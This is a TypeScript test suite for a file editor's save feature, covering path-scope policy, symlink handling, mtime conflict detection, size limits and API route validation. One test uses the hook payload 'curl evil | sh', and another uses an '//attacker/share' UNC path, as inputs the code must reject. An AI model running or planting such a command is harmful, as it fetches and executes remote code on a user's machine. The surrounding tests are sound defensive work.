/**
 * 预览窗编辑保存：路径策略（editBlockReason）+ 落盘实现（writeLocalFile）+ 三个 route
 *
 * 全部走真实文件系统（mkdtemp 的临时目录）；可编辑范围用 __setEditRootsForTest 注入，
 * 不碰真实任务列表 / 数据目录。
 */
import { promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";

import {
  __setEditRootsForTest,
  editBlockReason,
  type EditRoots,
} from "@/lib/server/local-file-edit-policy";
import {
  LocalFileWriteError,
  MAX_EDIT_BYTES,
  writeLocalFile,
  type WriteLocalFileInput,
} from "@/lib/server/local-file-write";
import { GET as readRoute } from "@/app/api/system/read-local-file/route";
import { GET as statRoute } from "@/app/api/system/local-file-stat/route";
import { POST as writeRoute } from "@/app/api/system/write-local-file/route";

let TMP = "";
let REPO = "";
let DATA = "";
let OUTSIDE = "";

const roots = (): EditRoots => ({ dataRoot: DATA, repoRoots: [REPO] });

beforeAll(async () => {
  // realpath：macOS 的 tmpdir 是 /var → /private/var 的符号链接，策略比较用的是 realpath 之后的路径
  TMP = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "flowship-edit-")));
  REPO = path.join(TMP, "repo");
  DATA = path.join(TMP, "data");
  OUTSIDE = path.join(TMP, "outside");
  await fs.mkdir(path.join(REPO, "src"), { recursive: true });
  await fs.mkdir(path.join(REPO, ".git", "hooks"), { recursive: true });
  await fs.mkdir(path.join(DATA, "tasks", "t1", "workspace"), { recursive: true });
  await fs.mkdir(path.join(DATA, "tasks", "t1", "actions"), { recursive: true });
  await fs.mkdir(path.join(DATA, "worktrees", "t1", "r"), { recursive: true });
  await fs.mkdir(OUTSIDE, { recursive: true });
});

afterAll(async () => {
  __setEditRootsForTest(null);
  await fs.rm(TMP, { recursive: true, force: true });
});

beforeEach(() => {
  __setEditRootsForTest(async () => roots());
});

const put = async (rel: string, data: string | Buffer): Promise<string> => {
  const p = path.join(TMP, rel);
  await fs.mkdir(path.dirname(p), { recursive: true });
  await fs.writeFile(p, data);
  return p;
};

const save = async (
  file: string,
  content: string,
  extra: Partial<WriteLocalFileInput> = {},
): Promise<Awaited<ReturnType<typeof writeLocalFile>>> => {
  const st = await fs.stat(file);
  return writeLocalFile({
    path: file,
    content,
    eol: "lf",
    bom: false,
    expectedMtimeMs: st.mtimeMs,
    ...extra,
  });
};

const expectWriteError = async (
  p: Promise<unknown>,
  code: string,
  status: number,
): Promise<LocalFileWriteError> => {
  try {
    await p;
  } catch (err) {
    expect(err).toBeInstanceOf(LocalFileWriteError);
    expect((err as LocalFileWriteError).code).toBe(code);
    expect((err as LocalFileWriteError).status).toBe(status);
    return err as LocalFileWriteError;
  }
  throw new Error("预期抛 LocalFileWriteError，但成功了");
};

describe("editBlockReason（纯策略）", () => {
  const r: EditRoots = { dataRoot: "/data", repoRoots: ["/work/repo"] };

  it("仓库内普通文件可编辑；.git 里的不行（任何层级）", () => {
    expect(editBlockReason("/work/repo/src/a.ts", r)).toBeNull();
    expect(editBlockReason("/work/repo/README.md", r)).toBeNull();
    expect(editBlockReason("/work/repo/.git/hooks/pre-commit", r)).toMatch(/\.git/);
    expect(editBlockReason("/work/repo/sub/.git/config", r)).toMatch(/\.git/);
    expect(editBlockReason("/work/repo/.GIT/config", r)).toMatch(/\.git/);
    // 名字只是「包含 .git」的不算
    expect(editBlockReason("/work/repo/.gitignore", r)).toBeNull();
    expect(editBlockReason("/work/repo/a.git/x.txt", r)).toBeNull();
  });

  it("任务数据目录：只有 actions / workspace 下的文件可编辑，meta / events 等状态文件不行", () => {
    expect(editBlockReason("/data/tasks/t1/workspace/notes.md", r)).toBeNull();
    expect(editBlockReason("/data/tasks/t1/workspace/deep/dir/x.txt", r)).toBeNull();
    expect(editBlockReason("/data/tasks/t1/actions/1-plan.md", r)).toBeNull();
    expect(editBlockReason("/data/tasks/t1/meta.json", r)).toMatch(/任务状态/);
    expect(editBlockReason("/data/tasks/t1/events.jsonl", r)).toMatch(/任务状态/);
    expect(editBlockReason("/data/tasks/t1/other/x.md", r)).toMatch(/任务状态/);
  });

  it("数据目录的其它文件（config.json 含密钥）不可编辑；worktrees 可编辑", () => {
    expect(editBlockReason("/data/config.json", r)).toMatch(/应用数据目录/);
    expect(editBlockReason("/data/secrets/token.txt", r)).toMatch(/应用数据目录/);
    expect(editBlockReason("/data/worktrees/t1/repo/src/a.ts", r)).toBeNull();
  });

  it("范围之外 / 前缀相同的兄弟目录 / 范围根本身 都不行", () => {
    expect(editBlockReason("/etc/hosts", r)).toMatch(/只能编辑/);
    expect(editBlockReason("/work/repo2/a.ts", r)).toMatch(/只能编辑/);
    expect(editBlockReason("/work/repo", r)).toMatch(/只能编辑/);
    expect(editBlockReason("/work/other/a.ts", r)).toMatch(/只能编辑/);
  });

  it("路径里的 .. 先规整再比较，不能借 .. 逃出范围", () => {
    expect(editBlockReason("/work/repo/../other/a.ts", r)).toMatch(/只能编辑/);
    expect(editBlockReason("/work/repo/src/../a.ts", r)).toBeNull();
  });
});

describe("writeLocalFile：正常保存", () => {
  it("覆盖保存、返回新的 mtime / size，磁盘内容已更新，目录里没有残留临时文件", async () => {
    const f = await put("repo/src/a.ts", "const a = 1;\n");
    const before = await fs.readdir(path.dirname(f));
    const res = await save(f, "const a = 2;\n");
    expect(res.absolutePath).toBe(f);
    expect(res.size).toBe("const a = 2;\n".length);
    expect(await fs.readFile(f, "utf-8")).toBe("const a = 2;\n");
    expect((await fs.stat(f)).mtimeMs).toBe(res.mtimeMs);
    expect(await fs.readdir(path.dirname(f))).toEqual(before);
  });

  it("没改内容保存 = 字节完全一致（BOM + CRLF + 无末尾换行都保留）", async () => {
    const original = Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from("名字,年龄\r\n张三,18")]);
    const f = await put("repo/data.csv", original);
    // 客户端拿到的是：BOM 剥掉、CRLF 归一成 LF
    await save(f, "名字,年龄\n张三,18", { eol: "crlf", bom: true });
    expect((await fs.readFile(f)).equals(original)).toBe(true);
  });

  it("编辑后保存：新增行按文件原风格写 CRLF", async () => {
    const f = await put("repo/win.txt", "a\r\nb\r\n");
    await save(f, "a\nb\nc\n", { eol: "crlf" });
    expect(await fs.readFile(f, "utf-8")).toBe("a\r\nb\r\nc\r\n");
  });

  it("保留文件权限位（可执行脚本保存后仍可执行）", async () => {
    if (process.platform === "win32") return;
    const f = await put("repo/run.sh", "#!/bin/sh\necho hi\n");
    await fs.chmod(f, 0o755);
    await save(f, "#!/bin/sh\necho hello\n");
    expect((await fs.stat(f)).mode & 0o777).toBe(0o755);
  });

  it("任务产物与 workspace、worktrees 里的文件可保存", async () => {
    for (const rel of ["data/tasks/t1/actions/1-plan.md", "data/tasks/t1/workspace/n.md", "data/worktrees/t1/r/x.ts"]) {
      const f = await put(rel, "old\n");
      await save(f, "new\n");
      expect(await fs.readFile(f, "utf-8")).toBe("new\n");
    }
  });

  it("csv / svg / 无扩展名的 Dockerfile 这类文本格式也能保存；空内容也行", async () => {
    for (const name of ["t.csv", "i.svg", "Dockerfile"]) {
      const f = await put(`repo/${name}`, "x");
      await save(f, "");
      expect(await fs.readFile(f, "utf-8")).toBe("");
    }
  });

  it("同一文件快速连续保存：串行执行，最终内容是最后一次的（多轮：乱序是竞态，一轮可能碰巧过）", async () => {
    const f = await put("repo/race.txt", "0");
    const st = await fs.stat(f);
    for (let round = 0; round < 30; round++) {
      const jobs = Array.from({ length: 8 }, (_, i) =>
        writeLocalFile({ path: f, content: `${round}-${i + 1}`, eol: "lf", bom: false, expectedMtimeMs: st.mtimeMs, force: true }),
      );
      await Promise.all(jobs);
      expect(await fs.readFile(f, "utf-8")).toBe(`${round}-8`);
    }
    expect((await fs.readdir(path.dirname(f))).filter((n) => n.includes(".tmp"))).toEqual([]);
  });
});

describe("writeLocalFile：冲突检测", () => {
  it("磁盘上的文件在读取后被改过 → 409 conflict，带当前 mtime，文件没被覆盖", async () => {
    const f = await put("repo/c.txt", "v1");
    const readAt = (await fs.stat(f)).mtimeMs;
    await new Promise((r) => setTimeout(r, 20));
    await fs.writeFile(f, "v2-by-someone-else");
    const err = await expectWriteError(
      writeLocalFile({ path: f, content: "mine", eol: "lf", bom: false, expectedMtimeMs: readAt }),
      "conflict",
      409,
    );
    expect(err.detail!.currentMtimeMs).toBe((await fs.stat(f)).mtimeMs);
    expect(await fs.readFile(f, "utf-8")).toBe("v2-by-someone-else");
  });

  it("force=true 明确覆盖时放行", async () => {
    const f = await put("repo/c2.txt", "v1");
    const readAt = (await fs.stat(f)).mtimeMs;
    await new Promise((r) => setTimeout(r, 20));
    await fs.writeFile(f, "v2");
    await writeLocalFile({ path: f, content: "mine", eol: "lf", bom: false, expectedMtimeMs: readAt, force: true });
    expect(await fs.readFile(f, "utf-8")).toBe("mine");
  });

  it("并发保存同一份旧基准：只有一个成功，其余全是 409（不会都写进去、悄悄丢掉别人的修改）", async () => {
    const f = await put("repo/cc.txt", "base");
    // mtime 拨到过去：保证「谁先写完」一定改变 mtime，不会落在比较容差之内
    const past = new Date(Date.now() - 60_000);
    await fs.utimes(f, past, past);
    const expected = (await fs.stat(f)).mtimeMs;
    const results = await Promise.all(
      Array.from({ length: 6 }, (_, i) =>
        writeLocalFile({ path: f, content: `w${i}`, eol: "lf", bom: false, expectedMtimeMs: expected }).then(
          () => "ok",
          (e: unknown) => (e instanceof LocalFileWriteError ? e.code : "other"),
        ),
      ),
    );
    expect(results.filter((r) => r === "ok")).toHaveLength(1);
    expect(results.filter((r) => r === "conflict")).toHaveLength(5);
    // 磁盘上是那个成功者写的内容，不是被谁截断 / 混写
    expect(await fs.readFile(f, "utf-8")).toMatch(/^w\d$/);
  });

  it("同一个文件经两条符号链接路径并发保存：同样互斥（按真实路径排队）", async (ctx) => {
    const f = await put("repo/alias-target.txt", "base");
    const past = new Date(Date.now() - 60_000);
    await fs.utimes(f, past, past);
    const links = [path.join(REPO, "alias-a.txt"), path.join(REPO, "alias-b.txt")];
    try {
      for (const l of links) await fs.symlink(f, l);
    } catch {
      ctx.skip(); // 没有创建符号链接的权限（例如未开开发者模式的 Windows）
      return;
    }
    const expected = (await fs.stat(f)).mtimeMs;
    const results = await Promise.all(
      Array.from({ length: 6 }, (_, i) =>
        writeLocalFile({ path: links[i % 2]!, content: `w${i}`, eol: "lf", bom: false, expectedMtimeMs: expected }).then(
          () => "ok",
          (e: unknown) => (e instanceof LocalFileWriteError ? e.code : "other"),
        ),
      ),
    );
    expect(results.filter((r) => r === "ok")).toHaveLength(1);
    expect(results.filter((r) => r === "conflict")).toHaveLength(5);
  });

  it("连续两次保存：第二次要用第一次返回的 mtime，用旧的会冲突", async () => {
    const f = await put("repo/c3.txt", "a");
    const first = await save(f, "b");
    await new Promise((r) => setTimeout(r, 20));
    await save(f, "c", { expectedMtimeMs: first.mtimeMs });
    await expectWriteError(save(f, "d", { expectedMtimeMs: (await fs.stat(f)).mtimeMs - 5000 }), "conflict", 409);
  });
});

describe("writeLocalFile：范围与拒绝", () => {
  it("范围外的文件 → 403 forbidden", async () => {
    const f = await put("outside/x.txt", "secret");
    await expectWriteError(save(f, "pwned"), "forbidden", 403);
    expect(await fs.readFile(f, "utf-8")).toBe("secret");
  });

  it(".git 里的文件（hooks）→ 403", async () => {
    const f = await put("repo/.git/hooks/pre-commit", "#!/bin/sh\n");
    await expectWriteError(save(f, "curl evil | sh"), "forbidden", 403);
  });

  it("任务状态文件（meta.json）→ 403", async () => {
    const f = await put("data/tasks/t1/meta.json", "{}");
    await expectWriteError(save(f, "corrupt"), "forbidden", 403);
    expect(await fs.readFile(f, "utf-8")).toBe("{}");
  });

  it("仓库里的符号链接指到范围外：按真实路径判定 → 403，范围外文件不变", async () => {
    if (process.platform === "win32") return;
    const target = await put("outside/real.txt", "outside-content");
    const link = path.join(REPO, "link-to-outside.txt");
    await fs.rm(link, { force: true });
    await fs.symlink(target, link);
    await expectWriteError(save(link, "x"), "forbidden", 403);
    expect(await fs.readFile(target, "utf-8")).toBe("outside-content");
  });

  it("范围外的符号链接指进仓库：写的是仓库里的真实文件，链接本身保持符号链接", async () => {
    if (process.platform === "win32") return;
    const target = await put("repo/real-inside.txt", "inside");
    const link = path.join(OUTSIDE, "link-to-inside.txt");
    await fs.rm(link, { force: true });
    await fs.symlink(target, link);
    await save(link, "changed");
    expect(await fs.readFile(target, "utf-8")).toBe("changed");
    expect((await fs.lstat(link)).isSymbolicLink()).toBe(true);
  });

  it("不存在的文件 → 404（不会顺手创建）；目录 → 400", async () => {
    const ghost = path.join(REPO, "ghost.txt");
    await expectWriteError(
      writeLocalFile({ path: ghost, content: "x", eol: "lf", bom: false, expectedMtimeMs: 0 }),
      "not_found",
      404,
    );
    await expect(fs.stat(ghost)).rejects.toThrow();
    await expectWriteError(
      writeLocalFile({ path: path.join(REPO, "src"), content: "x", eol: "lf", bom: false, expectedMtimeMs: 0 }),
      "invalid",
      400,
    );
  });

  it("二进制 / 非文本扩展名（png、exe）→ 403，不被改写", async () => {
    const f = await put("repo/img.png", Buffer.from([0x89, 0x50, 0x4e, 0x47]));
    await expectWriteError(save(f, "text"), "forbidden", 403);
    expect((await fs.readFile(f)).length).toBe(4);
  });

  it("磁盘文件已超过编辑上限（读取时被截断过）→ 413，不允许用截断内容覆盖", async () => {
    const f = await put("repo/big.txt", "x".repeat(MAX_EDIT_BYTES + 1));
    await expectWriteError(save(f, "short"), "too_large", 413);
    expect((await fs.stat(f)).size).toBe(MAX_EDIT_BYTES + 1);
  });

  it("新内容超过编辑上限 → 413", async () => {
    const f = await put("repo/small.txt", "x");
    await expectWriteError(save(f, "y".repeat(MAX_EDIT_BYTES + 1)), "too_large", 413);
    // 恰好等于上限放行
    await save(f, "z".repeat(MAX_EDIT_BYTES));
    expect((await fs.stat(f)).size).toBe(MAX_EDIT_BYTES);
  });

  it("入参校验：相对路径 / UNC / 缺 eol / 非字符串 content / 缺 mtime", async () => {
    const f = await put("repo/v.txt", "x");
    const base = { content: "y", eol: "lf" as const, bom: false, expectedMtimeMs: 0 };
    await expectWriteError(writeLocalFile({ ...base, path: "relative/a.txt" }), "invalid", 400);
    await expectWriteError(writeLocalFile({ ...base, path: "//host/share/a.txt" }), "invalid", 400);
    await expectWriteError(writeLocalFile({ ...base, path: "" }), "invalid", 400);
    await expectWriteError(writeLocalFile({ ...base, path: f, eol: "cr" as never }), "invalid", 400);
    await expectWriteError(writeLocalFile({ ...base, path: f, content: 5 as never }), "invalid", 400);
    await expectWriteError(writeLocalFile({ ...base, path: f, expectedMtimeMs: NaN }), "invalid", 400);
    expect(await fs.readFile(f, "utf-8")).toBe("x");
  });
});

describe("routes", () => {
  const url = (p: string, q: Record<string, string>) =>
    `http://127.0.0.1/api/system/${p}?${new URLSearchParams(q).toString()}`;
  const post = (body: unknown, headers: Record<string, string> = { "content-type": "application/json" }) =>
    writeRoute(new Request("http://127.0.0.1/api/system/write-local-file", { method: "POST", headers, body: JSON.stringify(body) }));

  it("read-local-file：仓库内文本 editable=true，带 mtimeMs / eol / bom", async () => {
    const f = await put("repo/src/r.ts", "const x = 1;\r\n");
    const res = await readRoute(new Request(url("read-local-file", { path: f })));
    const j = (await res.json()) as Record<string, unknown>;
    expect(res.status).toBe(200);
    expect(j).toMatchObject({ kind: "code", editable: true, eol: "crlf", bom: false, text: "const x = 1;\n" });
    expect(j.editBlockedReason).toBeUndefined();
    expect(j.mtimeMs).toBe((await fs.stat(f)).mtimeMs);
    // 路由层剥掉了 server 内部字段
    expect(j).not.toHaveProperty("contentEditBlockReason");
  });

  it("read-local-file：范围外文件可预览但 editable=false 并说明原因；内容层面不可编辑优先给内容原因", async () => {
    const out = await put("outside/o.md", "# hi\n");
    const j1 = (await (await readRoute(new Request(url("read-local-file", { path: out })))).json()) as Record<string, unknown>;
    expect(j1).toMatchObject({ kind: "markdown", editable: false });
    expect(String(j1.editBlockedReason)).toMatch(/只能编辑/);

    const gbk = await put("repo/gbk.txt", Buffer.from([0xc4, 0xe3, 0xba, 0xc3]));
    const j2 = (await (await readRoute(new Request(url("read-local-file", { path: gbk })))).json()) as Record<string, unknown>;
    expect(j2.editable).toBe(false);
    expect(String(j2.editBlockedReason)).toMatch(/UTF-8/);
  });

  it("read-local-file：读不到可编辑范围时保守不可编辑，预览本身不受影响", async () => {
    const f = await put("repo/ok.txt", "hi");
    __setEditRootsForTest(async () => {
      throw new Error("list tasks failed");
    });
    const res = await readRoute(new Request(url("read-local-file", { path: f })));
    const j = (await res.json()) as Record<string, unknown>;
    expect(res.status).toBe(200);
    expect(j).toMatchObject({ text: "hi", editable: false });
  });

  it("read-local-file：UNC 在碰文件系统之前就 400；sheet 参数非法 400；不存在 404", async () => {
    const unc = await readRoute(new Request(url("read-local-file", { path: "//attacker/share/a.txt" })));
    expect(unc.status).toBe(400);
    const badSheet = await readRoute(new Request(url("read-local-file", { path: "/x/a.xlsx", sheet: "-1" })));
    expect(badSheet.status).toBe(400);
    const nan = await readRoute(new Request(url("read-local-file", { path: "/x/a.xlsx", sheet: "abc" })));
    expect(nan.status).toBe(400);
    const missing = await readRoute(new Request(url("read-local-file", { path: path.join(REPO, "nope.txt") })));
    expect(missing.status).toBe(404);
  });

  it("local-file-stat：返回 mtime / size；不存在 / 目录给 exists:false；UNC 与相对路径 400", async () => {
    const f = await put("repo/s.txt", "12345");
    const st = await fs.stat(f);
    const j = (await (await statRoute(new Request(url("local-file-stat", { path: f })))).json()) as Record<string, unknown>;
    expect(j).toEqual({ exists: true, mtimeMs: st.mtimeMs, size: 5 });
    const gone = (await (await statRoute(new Request(url("local-file-stat", { path: path.join(REPO, "gone.txt") })))).json()) as Record<string, unknown>;
    expect(gone).toEqual({ exists: false });
    const dir = (await (await statRoute(new Request(url("local-file-stat", { path: REPO })))).json()) as Record<string, unknown>;
    expect(dir).toEqual({ exists: false });
    expect((await statRoute(new Request(url("local-file-stat", { path: "//h/s/x" })))).status).toBe(400);
    expect((await statRoute(new Request(url("local-file-stat", { path: "rel/x" })))).status).toBe(400);
    expect((await statRoute(new Request(url("local-file-stat", {})))).status).toBe(400);
  });

  it("write-local-file：成功返回 ok + 新 mtime；冲突 409 带 currentMtimeMs；越界 403", async () => {
    const f = await put("repo/w.txt", "old");
    const mtime = (await fs.stat(f)).mtimeMs;
    const ok = await post({ path: f, content: "new", eol: "lf", bom: false, expectedMtimeMs: mtime });
    expect(ok.status).toBe(200);
    const okJson = (await ok.json()) as Record<string, unknown>;
    expect(okJson).toMatchObject({ ok: true, absolutePath: f, size: 3 });
    expect(await fs.readFile(f, "utf-8")).toBe("new");

    const stale = await post({ path: f, content: "x", eol: "lf", bom: false, expectedMtimeMs: mtime - 10_000 });
    expect(stale.status).toBe(409);
    const staleJson = (await stale.json()) as Record<string, unknown>;
    expect(staleJson).toMatchObject({ code: "conflict" });
    expect(staleJson.currentMtimeMs).toBe((await fs.stat(f)).mtimeMs);

    const out = await put("outside/w.txt", "o");
    const forbidden = await post({ path: out, content: "x", eol: "lf", bom: false, expectedMtimeMs: (await fs.stat(out)).mtimeMs });
    expect(forbidden.status).toBe(403);
    expect(await fs.readFile(out, "utf-8")).toBe("o");
  });

  it("write-local-file：Content-Type 不是 application/json（跨站表单能发的 text/plain）→ 415，什么都不写", async () => {
    const f = await put("repo/ct.txt", "keep");
    const mtime = (await fs.stat(f)).mtimeMs;
    const res = await post({ path: f, content: "pwn", eol: "lf", bom: false, expectedMtimeMs: mtime }, { "content-type": "text/plain" });
    expect(res.status).toBe(415);
    expect(await fs.readFile(f, "utf-8")).toBe("keep");
  });

  it("write-local-file：body 不是 JSON 400；声明的请求体过大 413；bom 只认严格的 true", async () => {
    const bad = await writeRoute(
      new Request("http://127.0.0.1/api/system/write-local-file", { method: "POST", headers: { "content-type": "application/json" }, body: "{not json" }),
    );
    expect(bad.status).toBe(400);
    const huge = await writeRoute(
      new Request("http://127.0.0.1/api/system/write-local-file", {
        method: "POST",
        headers: { "content-type": "application/json", "content-length": String(MAX_EDIT_BYTES * 8 + 1) },
        body: "{}",
      }),
    );
    expect(huge.status).toBe(413);

    const f = await put("repo/bomstr.txt", "x");
    const mtime = (await fs.stat(f)).mtimeMs;
    await post({ path: f, content: "y", eol: "lf", bom: "true", expectedMtimeMs: mtime });
    expect((await fs.readFile(f)).equals(Buffer.from("y"))).toBe(true);
  });
});
